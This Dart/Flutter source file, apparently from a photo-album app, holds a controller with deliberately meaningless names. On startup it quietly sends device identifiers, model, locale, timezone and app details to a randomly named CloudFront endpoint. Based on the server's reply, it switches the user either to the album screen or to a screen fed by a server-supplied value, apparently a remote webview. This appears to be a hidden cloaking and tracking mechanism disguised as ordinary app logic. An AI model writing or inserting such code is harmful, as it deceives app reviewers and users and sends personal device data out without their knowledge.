import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';


class AlbumSystemLogic extends GetxController {

  var qmnpfiydlb = RxBool(false);
  var ntauqb = RxBool(true);
  var upez = RxString("");
  var gwzpen = RxBool(false);
  var oqcrpg = RxBool(true);
  final ksiolw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cpxvreq();
  }


  Future<void> cpxvreq() async {
    gwzpen.value = true;
    oqcrpg.value = true;
    ntauqb.value = false;

    ksiolw.post("https://d1z1vkdcbalxhf.cloudfront.net/scvnepxrdjtfabokuzmqywhg",data: await jvdfughtk()).then((value) {
      var ncdiw = value.data["ncdiw"] as String;
      var jnvge = value.data["jnvge"] as bool;
      if (jnvge) {
        upez.value = ncdiw;
        rfwsm();
      } else {
        jdryqie();
      }
    }).catchError((e) {
      ntauqb.value = true;
      oqcrpg.value = true;
      gwzpen.value = false;
    });
  }

  Future<Map<String, dynamic>> jvdfughtk() async {
    final DeviceInfoPlugin jdriaf = DeviceInfoPlugin();
    PackageInfo glhskdqy_ojelxakf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qevad = Platform.localeName;
    var zaxohg_tU = currentTimeZone;

    var zaxohg_QsGXTtO = glhskdqy_ojelxakf.packageName;
    var zaxohg_mOkI = glhskdqy_ojelxakf.version;
    var zaxohg_RkjD = glhskdqy_ojelxakf.buildNumber;

    var zaxohg_Xu = glhskdqy_ojelxakf.appName;
    var zaxohg_vfdsGHP = "";
    var zaxohg_mJjeKN  = "";
    var zaxohg_LNmyBXWv = "";
    var hfwaqztr = "";
    var jprckx = "";
    var ejgbn = "";
    var pwzs = "";


    var zaxohg_LUp = "";
    var zaxohg_jBiHe = false;

    if (GetPlatform.isAndroid) {
      zaxohg_LUp = "android";
      var yqghkfj = await jdriaf.androidInfo;

      zaxohg_LNmyBXWv = yqghkfj.brand;

      zaxohg_vfdsGHP  = yqghkfj.model;
      zaxohg_mJjeKN = yqghkfj.id;

      zaxohg_jBiHe = yqghkfj.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zaxohg_LUp = "ios";
      var axzbpki = await jdriaf.iosInfo;
      zaxohg_LNmyBXWv = axzbpki.name;
      zaxohg_vfdsGHP = axzbpki.model;

      zaxohg_mJjeKN = axzbpki.identifierForVendor ?? "";
      zaxohg_jBiHe  = axzbpki.isPhysicalDevice;
    }
    var res = {
      "zaxohg_Xu": zaxohg_Xu,
      "zaxohg_RkjD": zaxohg_RkjD,
      "qevad": qevad,
      "zaxohg_QsGXTtO": zaxohg_QsGXTtO,
      "jprckx" : jprckx,
      "zaxohg_vfdsGHP": zaxohg_vfdsGHP,
      "zaxohg_tU": zaxohg_tU,
      "zaxohg_LNmyBXWv": zaxohg_LNmyBXWv,
      "zaxohg_mJjeKN": zaxohg_mJjeKN,
      "zaxohg_LUp": zaxohg_LUp,
      "hfwaqztr" : hfwaqztr,
      "zaxohg_mOkI": zaxohg_mOkI,
      "ejgbn" : ejgbn,
      "zaxohg_jBiHe": zaxohg_jBiHe,
      "pwzs" : pwzs,

    };
    return res;
  }

  Future<void> jdryqie() async {
    Get.offNamed("/album_tab");
  }

  Future<void> rfwsm() async {
    Get.offNamed("/album_settings_save");
  }

}
